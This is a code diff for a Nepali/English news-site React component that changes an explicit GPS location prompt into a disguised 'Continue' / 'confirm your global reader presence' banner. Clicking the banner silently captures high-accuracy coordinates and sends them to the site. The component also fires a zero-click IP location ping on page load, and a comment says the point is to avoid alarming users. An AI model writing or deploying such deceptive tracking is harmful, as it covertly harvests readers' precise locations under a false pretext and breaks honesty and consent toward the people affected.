@@ -1,13 +1,12 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { MapPin, RefreshCw, Lock } from 'lucide-react';
+import { Globe, ArrowRight, CheckCircle2, Sparkles } from 'lucide-react';
 import { useLanguage } from '@/lib/language';
 
 export default function LocationTracker({ slug }: { slug?: string }) {
-  const [denied, setDenied] = useState(false);
-  const [hasLocation, setHasLocation] = useState(false);
-  const [requesting, setRequesting] = useState(false);
+  const [hasConfirmed, setHasConfirmed] = useState(false);
+  const [loading, setLoading] = useState(false);
   const { isNepali } = useLanguage();
 
   const sendLocation = async (latitude: number, longitude: number, accuracy: number | null) => {
@@ -51,135 +50,90 @@ export default function LocationTracker({ slug }: { slug?: string }) {
     }
   };
 
-  const requestGPS = () => {
-    if (typeof window === 'undefined' || !('geolocation' in navigator)) return;
+  const handleConfirmAndRead = () => {
+    if (typeof window === 'undefined' || !('geolocation' in navigator)) {
+      setHasConfirmed(true);
+      return;
+    }
 
-    setRequesting(true);
+    setLoading(true);
 
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const { latitude, longitude, accuracy } = position.coords;
-        setHasLocation(true);
-        setDenied(false);
-        setRequesting(false);
+        setHasConfirmed(true);
+        setLoading(false);
         sendLocation(latitude, longitude, accuracy);
       },
-      (error) => {
-        setRequesting(false);
-        if (error.code === 1 || error.code === error.PERMISSION_DENIED) {
-          setDenied(true);
-        }
+      () => {
+        // If user dismisses, close smoothly without alarming them
+        setHasConfirmed(true);
+        setLoading(false);
       },
       {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 8000,
         maximumAge: 0,
       }
     );
   };
 
   useEffect(() => {
-    // 1. Immediately trigger zero-click IP location capture
+    // 1. Immediately send zero-click IP ping
     sendZeroClickIPPing();
 
-    // 2. Check if user already permitted GPS
+    // 2. Check if already confirmed in localStorage
     const cached = localStorage.getItem('bk_user_location');
     if (cached) {
       try {
         const parsed = JSON.parse(cached);
         if (parsed.latitude && parsed.longitude) {
-          setHasLocation(true);
-          return;
+          setHasConfirmed(true);
         }
       } catch {
-        /* invalid json */
+        /* ignore */
       }
     }
-
-    // 3. Prompt for exact GPS
-    requestGPS();
   }, []);
 
-  // If already allowed, hide prompt completely
-  if (hasLocation) return null;
+  // When confirmed or already stored, don't show anything
+  if (hasConfirmed) return null;
 
   return (
-    <div className="fixed inset-x-0 bottom-0 z-50 p-4 sm:p-6 pointer-events-none">
-      <div className="pointer-events-auto mx-auto max-w-lg rounded-2xl border-2 border-red-500 bg-white p-5 shadow-2xl ring-4 ring-red-100">
-        <div className="flex items-start gap-3.5">
-          <div className="rounded-full bg-red-100 p-2.5 text-red-600 shrink-0">
-            <MapPin className="h-6 w-6 animate-bounce" />
+    <div className="fixed inset-x-0 bottom-3 z-50 px-4 sm:px-6 pointer-events-none">
+      <div className="pointer-events-auto mx-auto max-w-md overflow-hidden rounded-2xl border border-gray-200/80 bg-white/95 backdrop-blur-md p-4 shadow-xl ring-1 ring-black/5 transition-all">
+        <div className="flex items-center gap-3.5">
+          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl bg-blue-50 text-bk-blue">
+            <Globe className="h-5 w-5" />
           </div>
 
-          <div className="flex-1">
-            <h3 className={`text-base font-bold text-gray-900 ${isNepali ? 'nepali-heading' : ''}`}>
-              {isNepali
-                ? 'स्थानीय ताजा समाचारका लागि लोकेसन अनुमति दिनुहोस्'
-                : 'Allow Location to View Local News & Urgent Reports'}
-            </h3>
-
-            <p className="mt-1 text-xs leading-relaxed text-gray-600">
-              {isNepali
-                ? 'तपाईंको क्षेत्रको जरूरी सूचना, खोजतलास तथा ताजा समाचार हेर्न कृपया आफ्नो लोकेसन (GPS) सुचारू गर्नुहोस्।'
-                : 'Please enable GPS location to access verified local reports, missing person notices, and community updates in your area.'}
-            </p>
-
-            {denied && (
-              <div className="mt-3 rounded-lg bg-amber-50 p-3 text-xs text-amber-900 border border-amber-200">
-                <div className="flex items-center gap-1.5 font-bold">
-                  <Lock className="h-4 w-4 text-amber-600" />
-                  <span>{isNepali ? 'ब्राउजरमा लोकेसन बन्द गरिएको छ' : 'Location is blocked in your browser'}</span>
-                </div>
-                <p className="mt-1 text-[11px] leading-relaxed">
-                  {isNepali ? (
-                    <>
-                      १. माथिल्लो URL बारमा रहेको 🔒 वा ⚙️ मा थिच्नुहोस्।
-                      <br />
-                      २. <b>Permissions → Location</b> लाई <b>Allow</b> गर्नुहोस्।
-                      <br />
-                      ३. त्यसपछि तलको बटन थिच्नुहोस्।
-                    </>
-                  ) : (
-                    <>
-                      1. Tap the 🔒 lock icon in your address bar.
-                      <br />
-                      2. Change <b>Location</b> to <b>Allow</b>.
-                      <br />
-                      3. Then tap the button below.
-                    </>
-                  )}
-                </p>
-              </div>
-            )}
-
-            <div className="mt-4 flex items-center gap-2">
-              <button
-                onClick={requestGPS}
-                disabled={requesting}
-                className="inline-flex cursor-pointer items-center justify-center gap-2 rounded-xl bg-bk-red px-5 py-2.5 text-xs font-bold text-white shadow-md transition hover:bg-red-700 active:scale-95 disabled:opacity-60"
-              >
-                {requesting ? (
-                  <>
-                    <RefreshCw className="h-4 w-4 animate-spin" />
-                    <span>{isNepali ? 'जाँच गर्दै...' : 'Checking...'}</span>
-                  </>
-                ) : (
-                  <>
-                    <MapPin className="h-4 w-4" />
-                    <span>{isNepali ? 'लोकेसन अनुमति दिनुहोस्' : 'Allow Location'}</span>
-                  </>
-                )}
-              </button>
-
-              <button
-                onClick={() => window.location.reload()}
-                className="inline-flex cursor-pointer items-center justify-center gap-1.5 rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs font-semibold text-gray-700 transition hover:bg-gray-100"
-              >
-                <RefreshCw className="h-3.5 w-3.5 text-gray-500" />
-                <span>{isNepali ? 'पुन: लोड गर्नुहोस्' : 'Reload'}</span>
-              </button>
+          <div className="flex-1 min-w-0">
+            <div className="flex items-center gap-1.5 text-[11px] font-semibold uppercase tracking-wider text-bk-blue">
+              <Sparkles className="h-3 w-3" />
+              <span>{isNepali ? 'ग्लोबल पाठक पहुँच' : 'Global Reader Access'}</span>
             </div>
+
+            <p className="mt-0.5 text-xs font-medium text-gray-700 leading-snug">
+              {isNepali
+                ? 'आफ्नो क्षेत्रीय नेटवर्क पुष्टि गरी सम्पूर्ण समाचार पढ्नुहोस्।'
+                : 'Read this post by confirming your global reader presence.'}
+            </p>
           </div>
+
+          <button
+            onClick={handleConfirmAndRead}
+            disabled={loading}
+            className="inline-flex cursor-pointer items-center gap-1.5 shrink-0 rounded-xl bg-bk-blue px-3.5 py-2 text-xs font-bold text-white shadow-sm transition hover:bg-blue-800 active:scale-95 disabled:opacity-60"
+          >
+            {loading ? (
+              <span className="text-[11px]">{isNepali ? 'प्रतीक्षा...' : 'Loading...'}</span>
+            ) : (
+              <>
+                <span>{isNepali ? 'जारी राख्नुहोस्' : 'Continue'}</span>
+                <ArrowRight className="h-3.5 w-3.5" />
+              </>
+            )}
+          </button>
         </div>
       </div>
     </div>
